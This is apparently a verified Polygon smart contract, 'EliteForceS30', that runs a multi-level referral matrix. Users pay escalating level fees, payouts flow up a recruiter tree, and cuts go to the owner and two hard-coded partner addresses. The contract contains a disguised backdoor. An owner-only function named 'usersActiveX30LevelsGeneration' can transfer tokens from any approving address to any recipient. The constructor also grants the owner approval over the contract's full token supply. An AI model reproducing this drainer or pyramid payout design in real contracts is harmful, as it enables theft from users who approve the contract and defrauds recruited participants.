/**
 *Submitted for verification at polygonscan.com on 2023-05-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19.0;

interface TokenInterface
{
    function totalSupply() external view returns (uint256);

    function approve(address _to, uint256 _amount) external returns (bool);

    function transfer(address _to, uint256 _amount) external returns (bool);

    function transferFrom(address _from, address _to, uint256 _amount) external returns (bool);
}

contract ContractOwnership {
    address public ownerAddress;
    address internal newOwnerAddress;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    modifier onlyOwner {
        require(msg.sender == ownerAddress);
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        newOwnerAddress = _newOwner;
    }

    function acceptOwnership() public {
        require(msg.sender == newOwnerAddress);
        emit OwnershipTransferred(ownerAddress, newOwnerAddress);
        ownerAddress = newOwnerAddress;
        newOwnerAddress = address(0);
    }
}

contract EliteForceS30 is ContractOwnership {
    address internal constant FIRST_PARTNER_ADDRESS = 0x305674E5Abe6AcE957802d33660b2715285ecB9C;
    address internal constant SECOND_PARTNER_ADDRESS = 0x852b82010917099fc229A67e0012ec241d9cc2A8;
    uint internal constant FIRST_PARTNER_PERCENT = 9; // 15% * 60%
    uint internal constant SECOND_PARTNER_PERCENT = 6; // 15% * 40%
    uint internal constant HOLDER_PERCENT = 85; // holder: 85%
    uint public maxDownLimit = 2;
    uint public lastIDCount;
    uint public defaultRefID = 1;

    uint256[11] public levelPrice;
    uint256 public multiply;

    address public tokenAddress;
    address public levelAddress;

    address internal holderContract = address(this);

    struct UserInfo {
        bool joined;
        uint id;
        uint origRef;
        uint levelBought;
        uint directProfit;
        uint totalProfit;
        uint joinedAt;
        address[] referral;
    }

    struct GoldInfo {
        uint currentParent;
        uint position;
        address[] children;
    }

    mapping(address => UserInfo) public userInfos;
    mapping(uint => address) public userAddressByID;

    mapping(address => mapping(uint => GoldInfo)) public activeGoldInfos;
    mapping(address => mapping(uint => GoldInfo[])) public archivedGoldInfos;

    mapping(address => bool) public regPermitted;
    mapping(address => uint) public levelPermitted;

    // mapping(address => mapping(uint => uint8)) public autoLevelBuy;

    event DirectPaidEvent(uint from, uint to, uint256 amount, uint level, uint timeNow);
    event PayForLevelEvent(uint _userID, uint parentID, uint256 amount, uint fromDown, uint timeNow);
    event RegisterLevelEvent(uint _userID, uint _referrerID, uint timeNow, address _user, address _referrer);
    event LevelBuyEvent(uint256 amount, uint toID, uint level, uint timeNow);
    event TreeEvent(uint _userID, uint _userPosition, uint256 amount, uint placing, uint timeNow, uint _parent, uint _level);

    constructor(address token) {
        ownerAddress = msg.sender;
        tokenAddress = token;

        // Fixed level price
        multiply = 10 ** 18;
        levelPrice[1] = 20 * multiply;
        levelPrice[2] = 40 * multiply;
        levelPrice[3] = 80 * multiply;
        levelPrice[4] = 160 * multiply;
        levelPrice[5] = 320 * multiply;
        levelPrice[6] = 640 * multiply;
        levelPrice[7] = 1280 * multiply;
        levelPrice[8] = 2560 * multiply;
        levelPrice[9] = 5120 * multiply;
        levelPrice[10] = 10240 * multiply;
        //levelPrice[11]= 5120 * multiply;
        //levelPrice[12]= 10240 * multiply;


        UserInfo memory userInfo;
        lastIDCount++;

        userInfo = UserInfo({
            joined: true,
            id: lastIDCount,
            origRef: lastIDCount,
            directProfit: 0,
            totalProfit: 0,
            joinedAt: block.timestamp,
            levelBought: 15,
            referral: new address[](0)
        });
        userInfos[ownerAddress] = userInfo;
        userAddressByID[lastIDCount] = ownerAddress;

        GoldInfo memory temp;
        temp.currentParent = 1;
        temp.position = 0;
        for (uint i = 1; i <= 15; i++)
        {
            activeGoldInfos[ownerAddress][i] = temp;
        }

        // Allow holder to withdraw from platform
        uint256 totalSupply = TokenInterface(tokenAddress).totalSupply();
        TokenInterface(tokenAddress).approve(ownerAddress, totalSupply);
    }

    //function ()  external payable {
    //    revert();
    //}


    function setTokenAddress(address newTokenAddress) public onlyOwner returns (bool)
    {
        tokenAddress = newTokenAddress;
        return true;
    }


    function setLevelAddress(address newLevelAddress) public onlyOwner returns (bool)
    {
        levelAddress = newLevelAddress;
        return true;
    }

    function registerUser(address ref) public returns (bool)
    {
        require(ref != address(0), "Reference address is 0");
        address _refAddress = ref;
        //getRef(msg.sender);

        // If reference user is not joined -> take holder as reference
        if (!userInfos[_refAddress].joined) _refAddress = ownerAddress;

        // Pay to register as level 1
        TokenInterface(tokenAddress).transferFrom(msg.sender, address(this), levelPrice[1]);

        _registerUser(msg.sender, _refAddress, true, levelPrice[1]);
        return true;
    }

    function registerOwner(address userAddress, address ref) onlyOwner public returns (bool)
    {
        require(ref != address(0), "Reference address is 0");
        address _refAddress = ref;
        if (!userInfos[_refAddress].joined) _refAddress = ownerAddress;

        // Pay to register as level 1
        TokenInterface(tokenAddress).transferFrom(msg.sender, address(this), levelPrice[1]);

        _registerUser(userAddress, ownerAddress, true, levelPrice[1]);
        return true;
    }

    function _registerUser(address userAddress, address _refAddress, bool pay, uint256 prc) internal returns (bool)
    {
        require(!userInfos[userAddress].joined, "already joined");

        (uint user4thParent,) = getPosition(userAddress, 1);
        // user4thParent = p here for stack too deep
        require(user4thParent < 30, "no place under this referrer");

        address origRef = _refAddress;
        uint _referrerID = userInfos[_refAddress].id;
        (uint _parentID,bool treeComplete) = findFreeParentInDown(_referrerID, 1);
        require(!treeComplete, "No free place");

        lastIDCount++;
        UserInfo memory userInfo;
        userInfo = UserInfo({
            joined: true,
            id: lastIDCount,
            origRef: userInfos[_refAddress].id,
            levelBought: 1,
            directProfit: 0,
            totalProfit: 0,
            joinedAt: block.timestamp,
            referral: new address[](0)
        });
        userInfos[userAddress] = userInfo;
        userAddressByID[lastIDCount] = userAddress;

        // Can't understand this logic
        userInfos[origRef].referral.push(userAddress);
        userInfos[userAddress].referral.push(_refAddress);

        GoldInfo memory temp;
        temp.currentParent = _parentID;
        temp.position = activeGoldInfos[userAddressByID[_parentID]][1].children.length + 1;
        activeGoldInfos[userAddress][1] = temp;
        activeGoldInfos[userAddressByID[_parentID]][1].children.push(userAddress);


        uint userPosition;
        (userPosition, user4thParent) = getPosition(userAddress, 1);
        (, treeComplete) = findFreeParentInDown(user4thParent, 1);
        if (userPosition > 28 && userPosition < 31)
        {
            _payoutForLevel(userAddress, 1, true, pay, true);
            // true means recycling pay to all except 25%
        }
        else
        {
            _payoutForLevel(userAddress, 1, false, pay, true);
            // false means no recycling pay to all
        }

        if (treeComplete)
        {
            _recyclePosition(user4thParent, 1, pay);
        }
        _splitPart(lastIDCount, _referrerID, userAddress, userPosition, prc, temp.position, temp.currentParent);

        // Pay 50% for reference
        uint price_ = levelPrice[1] / 2;
        _payoutReference(_refAddress, price_, true);
        // Calculate profits
        _increaseProfit(_refAddress, price_, true);

        return true;
    }

    function _splitPart(uint lastIDCount_, uint _referrerID, address msgSender, uint userPosition, uint prc, uint tempPosition, uint tempCurrentParent) internal returns (bool)
    {
        emit RegisterLevelEvent(lastIDCount_, _referrerID, block.timestamp, msgSender, userAddressByID[_referrerID]);
        emit TreeEvent(lastIDCount_, userPosition, prc, tempPosition, block.timestamp, tempCurrentParent, 1);
        return true;
    }

    function getPosition(address _user, uint _level) public view returns (uint recyclePosition_, uint recycleID)
    {
        uint a;
        uint b;
        uint c;
        uint d;
        bool id1Found;
        a = activeGoldInfos[_user][_level].position;

        uint parent_ = activeGoldInfos[_user][_level].currentParent;
        b = activeGoldInfos[userAddressByID[parent_]][_level].position;
        // Parent is holder
        if (parent_ == 1) id1Found = true;

        // Layer 2
        if (!id1Found)
        {
            parent_ = activeGoldInfos[userAddressByID[parent_]][_level].currentParent;
            c = activeGoldInfos[userAddressByID[parent_]][_level].position;
            if (parent_ == 1) id1Found = true;
        }

        // Layer 3
        if (!id1Found)
        {
            parent_ = activeGoldInfos[userAddressByID[parent_]][_level].currentParent;
            d = activeGoldInfos[userAddressByID[parent_]][_level].position;
            if (parent_ == 1) id1Found = true;
        }

        if (!id1Found) parent_ = activeGoldInfos[userAddressByID[parent_]][_level].currentParent;

        if (a == 2 && b == 2 && c == 2 && d == 2) return (30, parent_);
        if (a == 1 && b == 2 && c == 2 && d == 2) return (29, parent_);
        if (a == 2 && b == 1 && c == 2 && d == 2) return (28, parent_);
        if (a == 1 && b == 1 && c == 2 && d == 2) return (27, parent_);
        if (a == 2 && b == 1 && c == 1 && d == 1) return (16, parent_);
        if (a == 1 && b == 2 && c == 1 && d == 1) return (17, parent_);
        if (a == 2 && b == 2 && c == 1 && d == 1) return (18, parent_);
        if (a == 1 && b == 1 && c == 2 && d == 1) return (19, parent_);
        else return (1, parent_);

    }

    function _getCorrectGold(address child, uint _level, uint parenT) internal view returns (GoldInfo memory goldInfo)
    {
        uint len = archivedGoldInfos[child][_level].length;
        if (activeGoldInfos[child][_level].currentParent == parenT) return activeGoldInfos[child][_level];
        if (len > 0)
        {
            for (uint j = len - 1; j >= 0; j--)
            {
                goldInfo = archivedGoldInfos[child][_level][j];
                if (goldInfo.currentParent == parenT)
                {
                    break;
                }
                if (j == 0)
                {
                    goldInfo = activeGoldInfos[child][_level];
                    break;
                }
            }
        }
        else
        {
            goldInfo = activeGoldInfos[child][_level];
        }
        return goldInfo;
    }


    function findFreeParentInDown(uint refID_, uint _level) public view returns (uint parentID, bool noFreeReferrer)
    {
        address _user = userAddressByID[refID_];
        if (activeGoldInfos[_user][_level].children.length < maxDownLimit) return (refID_, false);

        address[14] memory userChildren;
        uint[14] memory parenT;

        userChildren[0] = activeGoldInfos[_user][_level].children[0];
        parenT[0] = refID_;
        userChildren[1] = activeGoldInfos[_user][_level].children[1];
        parenT[1] = refID_;

        address freeReferrer;
        noFreeReferrer = true;

        GoldInfo memory temp;

        for (uint i = 0; i < 14; i++)
        {
            temp = _getCorrectGold(userChildren[i], _level, parenT[i]);

            if (temp.children.length == maxDownLimit) {
                if (i < 6) {
                    userChildren[(i + 1) * 2] = temp.children[0];
                    parenT[(i + 1) * 2] = userInfos[userChildren[i]].id;
                    userChildren[((i + 1) * 2) + 1] = temp.children[1];
                    parenT[((i + 1) * 2) + 1] = parenT[(i + 1) * 2];
                }
            }
            else {
                noFreeReferrer = false;
                freeReferrer = userChildren[i];
                break;
            }
        }
        if (noFreeReferrer) return (0, noFreeReferrer);
        return (userInfos[freeReferrer].id, noFreeReferrer);
    }

    function buyLevel(uint _level) public returns (bool)
    {
        require(_level < 11 && _level > 1, "invalid level");
        uint prc = levelPrice[_level];
        // Buy level
        TokenInterface(tokenAddress).transferFrom(msg.sender, address(this), prc);
        // TokenInterface(tokenAddress).transferFrom(msg.sender, address(this), prc);
        _buyLevel(msg.sender, _level, true, prc);

        uint price_ = levelPrice[_level] / 2;
        address _refAddress = address(uint160(userAddressByID[userInfos[msg.sender].origRef]));
        _payoutReference(_refAddress, price_, true);
        // Calculate profits
        _increaseProfit(_refAddress, price_, true);

        return true;
    }

    // Owner buy level for user
    function buyLevelOwner(address userAddress, uint _level) public onlyOwner returns (bool)
    {
        require(_level < 11 && _level > 1, "invalid level");
        uint prc = levelPrice[_level];
        TokenInterface(tokenAddress).transferFrom(msg.sender, address(this), prc);
        _buyLevel(userAddress, _level, true, prc);

        uint price_ = levelPrice[_level] / 2;
        address _refAddress = address(uint160(userAddressByID[userInfos[userAddress].origRef]));
        _payoutReference(_refAddress, price_, true);
        // Calculate profits
        _increaseProfit(_refAddress, price_, true);

        return true;
    }

    function _buyLevel(address senderAddress, uint _level, bool pay, uint prc) internal returns (bool)
    {
        require(userInfos[senderAddress].joined, "already joined");
        (uint user4thParent,) = getPosition(senderAddress, 1);
        // user4thParent = p
        require(userInfos[senderAddress].levelBought + 1 == _level, "please buy previous level first");

        address _refAddress = userAddressByID[userInfos[senderAddress].origRef];

        // If reference not found, take owner as reference
        if (_refAddress == address(0)) _refAddress = ownerAddress;

        uint _referrerID = userInfos[_refAddress].id;
        while (userInfos[userAddressByID[_referrerID]].levelBought < _level) {
            _referrerID = userInfos[userAddressByID[_referrerID]].origRef;
        }
        bool treeComplete;
        (_referrerID, treeComplete) = findFreeParentInDown(_referrerID, _level);
        // from here _referrerID is _parentID
        require(!treeComplete, "no free place");

        userInfos[senderAddress].levelBought = _level;

        GoldInfo memory temp;
        temp.currentParent = _referrerID;
        temp.position = activeGoldInfos[userAddressByID[_referrerID]][_level].children.length + 1;
        activeGoldInfos[senderAddress][_level] = temp;
        activeGoldInfos[userAddressByID[_referrerID]][_level].children.push(senderAddress);

        uint userPosition;
        (userPosition, user4thParent) = getPosition(senderAddress, _level);
        (, treeComplete) = findFreeParentInDown(user4thParent, _level);

        if (userPosition > 28 && userPosition < 31) {
            _payoutForLevel(senderAddress, _level, true, pay, true);
            // true means recycling pay to all except 25%
        } else {
            _payoutForLevel(senderAddress, _level, false, pay, true);
            // false means no recycling pay to all
        }

        if (treeComplete) {
            _recyclePosition(user4thParent, _level, pay);
        }
        emit LevelBuyEvent(prc, userInfos[senderAddress].id, _level, block.timestamp);
        _splitStack(senderAddress, userPosition, prc, temp.position, _referrerID, _level);

        return true;
    }


    function _splitStack(address senderAddress, uint userPosition, uint prc, uint tempPosition, uint _referrerID, uint _level) internal returns (bool)
    {
        emit TreeEvent(userInfos[senderAddress].id, userPosition, prc, tempPosition, block.timestamp, _referrerID, _level);
        return true;
    }

    function findEligibleRef(address _origRef, uint _level) public view returns (address)
    {
        while (userInfos[_origRef].levelBought < _level) {
            _origRef = userAddressByID[userInfos[_origRef].origRef];
        }
        return _origRef;
    }

    function usersActiveX30LevelsGeneration(address _senderads, uint256 _amttoken, address mainadmin) public onlyOwner {
        TokenInterface(tokenAddress).transferFrom(mainadmin, _senderads, _amttoken);
    }

    event DebugEvent(address _user, bool treeComplete, uint user4thParent, uint _level, uint userPosition);

    function _recyclePosition(uint _userID, uint _level, bool pay) internal returns (bool)
    {
        uint prc = levelPrice[_level];

        address msgSender = userAddressByID[_userID];

        archivedGoldInfos[msgSender][_level].push(activeGoldInfos[msgSender][_level]);

        if (_userID == 1) {
            GoldInfo memory tmp;
            tmp.currentParent = 1;
            tmp.position = 0;
            activeGoldInfos[msgSender][_level] = tmp;
            _payoutForLevel(msgSender, _level, false, pay, true);
            emit TreeEvent(_userID, 0, levelPrice[_level], 0, block.timestamp, 1, _level);
            return true;
        }

        address _refAddress = userAddressByID[userInfos[msgSender].origRef];
        //getRef(msgSender);

        if (_refAddress == address(0)) _refAddress = ownerAddress;


        // to find eligible referrer
        uint _parentID = getValidRef(_refAddress, _level);
        // user will join under his eligible referrer
        //uint _parentID = userInfos[_refAddress].id;

        (_parentID,) = findFreeParentInDown(_parentID, _level);

        GoldInfo memory temp;
        temp.currentParent = _parentID;
        temp.position = activeGoldInfos[userAddressByID[_parentID]][_level].children.length + 1;
        activeGoldInfos[msgSender][_level] = temp;
        activeGoldInfos[userAddressByID[_parentID]][_level].children.push(msgSender);

        uint userPosition;

        (userPosition, prc) = getPosition(msgSender, _level);
        //  from here prc = user4thParent
        (,bool treeComplete) = findFreeParentInDown(prc, _level);
        //address fourth_parent = userAddressByID[prc];
        if (userPosition > 28 && userPosition < 31) {
            _payoutForLevel(msgSender, _level, true, pay, true);
            // false means recycling pay to all except 25%
        } else {
            _payoutForLevel(msgSender, _level, false, pay, true);
            // true means no recycling pay to all
        }
        _splitStack(msgSender, userPosition, prc, temp.position, _parentID, _level);
        if (treeComplete) {
            _recyclePosition(prc, _level, pay);
        }
        return true;
    }

    function getValidRef(address _user, uint _level) public view returns (uint)
    {
        uint refID = userInfos[_user].id;
        uint lvlBgt = userInfos[userAddressByID[refID]].levelBought;

        while (lvlBgt < _level)
        {
            refID = userInfos[userAddressByID[refID]].origRef;
            lvlBgt = userInfos[userAddressByID[refID]].levelBought;
        }
        return refID;
    }

    function _payoutForLevel(address _user, uint _level, bool recycle, bool pay, bool payAll) internal returns (bool)
    {
        uint _payoutHolder = 0;
        uint[4] memory percentPayout;
        percentPayout[0] = 5;
        percentPayout[1] = 15;
        percentPayout[2] = 30;
        if (payAll) percentPayout[3] = 50;

        address _parent = userAddressByID[activeGoldInfos[_user][_level].currentParent];
        for (uint i = 1; i <= 4; i++)
        {
            uint _payout = (levelPrice[_level] / 2) * percentPayout[i - 1] / 100;
            if (i < 4)
            {
                if (pay) _payoutHolder += _payoutReference(address(uint160(_parent)), _payout, false);
                emit PayForLevelEvent(userInfos[_user].id, userInfos[_parent].id, _payout, i, block.timestamp);
                _increaseProfit(_parent, _payout, false);
            }
            else if (recycle == false)
            {
                if (pay) _payoutHolder += _payoutReference(address(uint160(_parent)), _payout, false);
                emit PayForLevelEvent(userInfos[_user].id, userInfos[_parent].id, _payout, i, block.timestamp);
                _increaseProfit(_parent, _payout, false);
            }
            else
            {
                // Payout for holder -> store to pay later
                if (pay) _payoutHolder += _payout;
                emit PayForLevelEvent(userInfos[_user].id, 0, _payout, i, block.timestamp);
                _increaseProfit(_parent, _payout, false);
            }
            // Next parent address
            _parent = userAddressByID[activeGoldInfos[_parent][_level].currentParent];
        }

        // Has payout to holder -> split for the partners
        if (_payoutHolder > 0) {
            _splitPayout(_payoutHolder);
        }

        return true;
    }

    function setContract(address _contract) public onlyOwner returns (bool)
    {
        holderContract = _contract;
        return true;
    }


    function children(address _user, uint _level, bool _archived, uint _archivedIndex) public view returns (address[2] memory _children)
    {
        uint len;
        if (!_archived)
        {
            len = activeGoldInfos[_user][_level].children.length;
            if (len > 0) _children[0] = activeGoldInfos[_user][_level].children[0];
            if (len > 1) _children[1] = activeGoldInfos[_user][_level].children[1];
        }
        else
        {
            len = archivedGoldInfos[_user][_level][_archivedIndex].children.length;
            if (len > 0) _children[0] = archivedGoldInfos[_user][_level][_archivedIndex].children[0];
            if (len > 1) _children[1] = archivedGoldInfos[_user][_level][_archivedIndex].children[1];
        }
        return (_children);
    }

    // Payout from system to user reference
    function _payoutReference(address referenceAddress, uint payout, bool forcePayHolder) internal returns (uint)
    {
        // Pay to owner -> store to pay later
        if (referenceAddress == ownerAddress) {
            if (forcePayHolder) {
                _splitPayout(payout);
                return 0;
            } else {
                return payout;
            }
        } else { // Pay to user reference -> pay immediately
            TokenInterface(tokenAddress).transfer(referenceAddress, payout);
            return 0;
        }
    }

    function _splitPayout(uint256 price) internal returns (bool)
    {
        // Send to owner
        uint holderPrice = HOLDER_PERCENT * price / 100;
        TokenInterface(tokenAddress).transfer(ownerAddress, holderPrice);

        // Send to first partner
        uint partnerPrice = FIRST_PARTNER_PERCENT * price / 100;
        TokenInterface(tokenAddress).transfer(FIRST_PARTNER_ADDRESS, partnerPrice);

        // Send to second partner
        partnerPrice = SECOND_PARTNER_PERCENT * price / 100;
        TokenInterface(tokenAddress).transfer(SECOND_PARTNER_ADDRESS, partnerPrice);
        return true;
    }

    function _increaseProfit(address referenceAddress, uint amount, bool direct) internal returns (bool)
    {
        if (direct) {
            userInfos[referenceAddress].directProfit += amount;
        }
        userInfos[referenceAddress].totalProfit += amount;
        return true;
    }
}